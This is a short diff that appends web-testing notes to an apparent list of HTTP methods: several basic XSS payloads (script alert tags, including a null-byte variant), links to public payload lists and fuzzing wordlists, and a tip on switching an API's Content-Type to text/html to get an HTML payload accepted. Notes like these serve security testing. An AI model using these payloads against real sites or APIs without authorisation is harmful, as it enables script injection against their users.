@@ -140,3 +140,18 @@ PATCH
 OPTIONS
 DELETE
 CONNECT
+
+
+Some xss payloads :
+<script>alert("xss")</script>
+<script>alert(1);</script>
+<%00script>alert(1)</%00script>
+SCRIPT>alert("XSS");///SCRIPT>
+some xss payloads: 
+https://github.com/payloadbox/xss-payload-list
+https://github.com/xmendez/wfuzz/tree/master/wordlist
+https://netsec.expert/posts/xss-in-2020
+XAS:
+Another useful XAS tip is to try altering the Content-Type header to 
+induce the API into accepting an HTML payload to spawn the script:
+Content-Type: text/html
